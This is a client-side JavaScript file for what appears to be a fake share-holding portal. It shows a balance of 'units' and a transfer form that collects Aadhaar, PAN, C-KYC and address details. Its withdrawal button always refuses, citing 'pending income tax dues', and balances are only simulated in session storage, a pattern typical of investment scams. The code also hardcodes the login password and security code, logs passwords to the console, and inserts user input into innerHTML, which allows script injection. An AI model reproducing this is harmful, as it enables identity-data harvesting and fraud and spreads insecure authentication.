// Wait for the DOM to be fully loaded before running the script
document.addEventListener('DOMContentLoaded', () => {
const VALID_USER_ID = "ajaygandhisairavula";
const VALID_PASSWORD = "Nani@9909";

const currentPage = (window.location.pathname.split('/').pop() || '').toLowerCase();

// DOM Elements
const loginView = document.getElementById("loginView");
const homeView = document.getElementById("homeView");
const loginForm = document.getElementById("loginForm");
const loginError = document.getElementById("loginError");
const userIdInput = document.getElementById("userId");
const passwordInput = document.getElementById("password");
const viewDocumentsBtn = document.getElementById("viewDocumentsBtn");
const shareBtn = document.getElementById("shareBtn");
const withdrawalBtn = document.getElementById("withdrawalBtn");
const pdfViewerSection = document.getElementById("pdfViewerSection");
const pdfFrame = document.getElementById("pdfFrame");
const closeViewerBtn = document.getElementById("closeViewerBtn");
const transferForm = document.getElementById("transferForm");
const customAlert = document.getElementById("customAlert");
const alertMessage = document.getElementById("alertMessage");
const alertOkBtn = document.getElementById("alertOkBtn");
const backToHomeBtn = document.getElementById("backToHomeBtn");
const submissionDetails = document.getElementById("submissionDetails");
const closeSuccessBtn = document.getElementById('closeSuccessBtn');
const backToHomeFromDocBtn = document.getElementById('backToHomeFromDocBtn');
const availableUnitsDisplay = document.getElementById('availableUnitsDisplay');

// Available units management
const INITIAL_AVAILABLE_UNITS = 196031;

function getAvailableUnits() {
  const stored = sessionStorage.getItem('availableUnits');
  return stored ? parseInt(stored, 10) : INITIAL_AVAILABLE_UNITS;
}

function setAvailableUnits(units) {
  sessionStorage.setItem('availableUnits', units.toString());
}

function updateAvailableUnitsDisplay() {
  if (availableUnitsDisplay) {
    const units = getAvailableUnits();
    availableUnitsDisplay.textContent = `Available units: ${units.toLocaleString('en-IN')} units`;
  }
}

function subtractUnits(amount) {
  const current = getAvailableUnits();
  const newTotal = current - amount;
  setAvailableUnits(newTotal);
  updateAvailableUnitsDisplay();
  return newTotal;
}

function resetAvailableUnits() {
  sessionStorage.removeItem('availableUnits');
  updateAvailableUnitsDisplay();
}

// Initialize available units display on transfer page
if (currentPage === 'transfer.html') {
  updateAvailableUnitsDisplay();
}

// Custom Alert Function
function showAlert(message) {
  if (!customAlert || !alertMessage) return;
  alertMessage.textContent = message;
  customAlert.classList.add('show');
  document.body.style.overflow = 'hidden';
  
  // Focus the OK button for better accessibility
  setTimeout(() => {
    alertOkBtn?.focus();
  }, 100);
}

// Close alert when clicking OK
alertOkBtn?.addEventListener('click', () => {
  customAlert?.classList.remove('show');
  document.body.style.overflow = '';
});

// Close alert when clicking outside the content
customAlert?.addEventListener('click', (e) => {
  if (e.target === customAlert) {
    customAlert.classList.remove('show');
    document.body.style.overflow = '';
  }
});

// Close alert with Escape key
document.addEventListener('keydown', (e) => {
  if (e.key === 'Escape' && customAlert?.classList.contains('show')) {
    customAlert.classList.remove('show');
    document.body.style.overflow = '';
  }
});

function showHome() {
  if (loginView && homeView) {
    loginView.hidden = true;
    homeView.hidden = false;
    return;
  }
  window.location.href = 'index.html';
}

function showLogin() {
  if (loginView && homeView) {
    homeView.hidden = true;
    loginView.hidden = false;
    return;
  }
  window.location.href = 'index.html';
}

function setLoggedIn(value) {
  if (value) {
    sessionStorage.setItem("isLoggedIn", "true");
  } else {
    sessionStorage.removeItem("isLoggedIn");
    resetAvailableUnits(); // Reset available units on logout
  }
}

function isLoggedIn() {
  return sessionStorage.getItem("isLoggedIn") === "true";
}

if ((currentPage === 'transfer.html' || currentPage === 'success.html' || currentPage === 'document.html') && !isLoggedIn()) {
  window.location.href = 'index.html';
  return;
}

if (loginView && homeView) {
  if (isLoggedIn()) {
    showHome();
  } else {
    showLogin();
  }
}

loginForm?.addEventListener("submit", (e) => {
  e.preventDefault();
  if (loginError) loginError.textContent = "";

  const userId = (userIdInput.value || "").trim();
  const password = passwordInput.value || "";

  console.log("Login attempt with:", { userId, password });

  // Check if fields are not empty
  if (!userId || !password) {
    if (loginError) loginError.textContent = "Please enter both user ID and password";
    return;
  }

  const isAuthenticated = userId === VALID_USER_ID && password === VALID_PASSWORD;

  if (!isAuthenticated) {
    if (loginError) loginError.textContent = "Invalid user ID or password";
    passwordInput.value = "";
    passwordInput.focus();
    setLoggedIn(false);
    return;
  }

  // If we get here, login was successful
  console.log("Login successful, proceeding to home view");
  
  // Set logged in state and show home view
  setLoggedIn(true);
  showHome();
  
  // Clear the form
  loginForm.reset();
  
  // Show welcome message
  showAlert(`Welcome back, ${userId}!`);
});

viewDocumentsBtn?.addEventListener("click", () => {
  window.location.href = 'document.html';
});

closeViewerBtn?.addEventListener("click", () => {
  if (!pdfFrame || !pdfViewerSection) return;
  pdfFrame.src = "";
  pdfViewerSection.hidden = true;
});

if (currentPage === 'document.html' && pdfFrame) {
  const pdfUrl = encodeURI('tata titan shares .pdf');
  pdfFrame.src = pdfUrl;
}

backToHomeFromDocBtn?.addEventListener('click', () => {
  window.location.href = 'index.html';
});

// Function to show security code input dialog
function showSecurityCodeInput(callback) {
  const securityCode = '998990'; // The required security code
  
  // Create a custom prompt
  alertMessage.innerHTML = `
    <div style="margin-bottom: 20px;">
      <p>Please enter the 6-digit security code to complete the transfer:</p>
      <input type="number" id="securityCodeInput" class="input" 
             style="width: 100%; padding: 10px; margin-top: 10px;" 
             placeholder="Enter security code" 
             inputmode="numeric" 
             pattern="\d{6}" 
             minlength="6" 
             maxlength="6" 
             required>
      <p id="securityCodeError" class="error" style="color: var(--danger); margin-top: 5px; display: none;">
        Invalid security code. Please try again.
      </p>
    </div>
  `;
  
  // Show the alert with custom content
  const alertContainer = document.getElementById('customAlert');
  if (!alertContainer) return;
  alertContainer.classList.add('show');
  document.body.style.overflow = 'hidden';
  
  // Focus the input field
  setTimeout(() => {
    const input = document.getElementById('securityCodeInput');
    if (input) input.focus();
  }, 100);
  
  // Handle the OK button click
  const originalClickHandler = alertOkBtn?.onclick;
  
  if (!alertOkBtn) return;
  alertOkBtn.onclick = () => {
    const input = document.getElementById('securityCodeInput');
    const errorElement = document.getElementById('securityCodeError');
    
    if (!input || input.value !== securityCode) {
      // Show error
      errorElement.style.display = 'block';
      input.focus();
      return false;
    }
    
    // Code is correct, proceed
    alertContainer.classList.remove('show');
    document.body.style.overflow = '';
    alertOkBtn.onclick = originalClickHandler; // Restore original handler
    callback(true);
    return false;
  };
  
  // Handle pressing Enter in the input field
  document.getElementById('securityCodeInput')?.addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
      e.preventDefault();
      alertOkBtn.click();
    }
  });
  
  // Handle cancel/close
  return () => {
    alertContainer.classList.remove('show');
    document.body.style.overflow = '';
    alertOkBtn.onclick = originalClickHandler;
    callback(false);
  };
}

 

// Form submission handler for transfer form (transfer.html)
transferForm?.addEventListener('submit', (e) => {
  e.preventDefault();
  
  // Check form validity
  if (!transferForm.checkValidity()) {
    transferForm.reportValidity();
    return;
  }
  
  // Get form values
  const formData = {
    ckycNo: document.getElementById('ckycNo').value,
    donateNo: document.getElementById('donateNo').value,
    aadharNo: document.getElementById('aadharNo').value,
    address: document.getElementById('address').value,
    pinCode: document.getElementById('pinCode').value,
    fullName: document.getElementById('fullName').value,
    panNo: document.getElementById('panNo').value,
    units: document.getElementById('units').value
  };
  
  // Validate Aadhar number (12 digits)
  if (!/^\d{12}$/.test(formData.aadharNo)) {
    showAlert('Please enter a valid 12-digit Aadhar number');
    return;
  }
  
  // Validate PAN number (10 characters: 5 letters, 4 digits, 1 letter)
  if (!/^[A-Z]{5}[0-9]{4}[A-Z]$/i.test(formData.panNo)) {
    showAlert('Please enter a valid PAN number (e.g., ABCDE1234F)');
    return;
  }
  
  // Validate PIN code (6 digits)
  if (!/^\d{6}$/.test(formData.pinCode)) {
    showAlert('Please enter a valid 6-digit PIN code');
    return;
  }
  
  // Validate units against available units
  const requestedUnits = parseInt(formData.units, 10);
  const availableUnits = getAvailableUnits();
  
  if (isNaN(requestedUnits) || requestedUnits <= 0) {
    showAlert('Please enter a valid number of units');
    return;
  }
  
  if (requestedUnits > availableUnits) {
    showAlert(`Insufficient units! You only have ${availableUnits.toLocaleString('en-IN')} units available. Please enter a smaller amount.`);
    return;
  }
  
  // If all validations pass, redirect to success.html after 5 seconds
  try {
    // Hide the form
    transferForm.hidden = true;
    
    // Show loading message
    showAlert('Processing your submission...');
    
    // Persist data for success page
    sessionStorage.setItem('transferSubmission', JSON.stringify(formData));
    
    // Subtract the units from available units
    const remainingUnits = subtractUnits(requestedUnits);
    console.log(`Successfully transferred ${requestedUnits} units. Remaining: ${remainingUnits}`);

    // Wait 5 seconds before redirecting to success page
    setTimeout(() => {
      customAlert?.classList.remove('show');
      document.body.style.overflow = '';
      window.location.href = 'success.html';
    }, 5000); // 5 second delay
    
  } catch (error) {
    console.error('Error processing form submission:', error);
    showAlert('An error occurred while processing your submission. Please try again.');
    transferForm.hidden = false;
  }
});

// Handle share button click
shareBtn?.addEventListener('click', () => {
  // Show security code input dialog
  showSecurityCodeInput((isValid) => {
    if (isValid) {
      window.location.href = 'transfer.html';
    } else {
      showAlert('Invalid security code. Please try again.');
    }
  });
});

backToHomeBtn?.addEventListener('click', () => {
  window.location.href = 'index.html';
});

if (submissionDetails) {
  const raw = sessionStorage.getItem('transferSubmission');
  let data = null;
  try {
    data = raw ? JSON.parse(raw) : null;
  } catch {
    data = null;
  }

  if (data) {
    const transferredUnits = parseInt(data.units, 10);
    const remainingUnits = getAvailableUnits();
    
    submissionDetails.innerHTML = `
      <p><strong>C-KYC Number:</strong> ${data.ckycNo ?? ''}</p>
      <p><strong>Donation Number:</strong> ${data.donateNo ?? ''}</p>
      <p><strong>Aadhar Number:</strong> ${data.aadharNo ?? ''}</p>
      <p><strong>Name:</strong> ${data.fullName ?? ''}</p>
      <p><strong>PAN Number:</strong> ${data.panNo ?? ''}</p>
      <p><strong>Address:</strong> ${data.address ?? ''}</p>
      <p><strong>Pin Code:</strong> ${data.pinCode ?? ''}</p>
      <p><strong>Units Transferred:</strong> ${transferredUnits.toLocaleString('en-IN')}</p>
      <p><strong>Remaining Units:</strong> ${remainingUnits.toLocaleString('en-IN')}</p>
    `;
  }
}

closeSuccessBtn?.addEventListener('click', () => {
  sessionStorage.removeItem('transferSubmission');
  window.location.href = 'index.html';
});

// Handle withdrawal button click
withdrawalBtn?.addEventListener('click', () => {
  // Create error popup content
  alertMessage.innerHTML = `
    <div class="error-container">
      <div class="error-animation">
        <div class="wrong-mark">✕</div>
      </div>
      <h3>Sorry, you are not eligible for withdrawal due to pending income tax dues.</h3>
    </div>
  `;
  
  // Show the alert with error content
  const alertContainer = document.getElementById('customAlert');
  if (!alertContainer) return;
  alertContainer.classList.add('show');
  document.body.style.overflow = 'hidden';
  
  // Focus the OK button
  setTimeout(() => {
    alertOkBtn?.focus();
  }, 100);
});

// Close the DOMContentLoaded event listener
});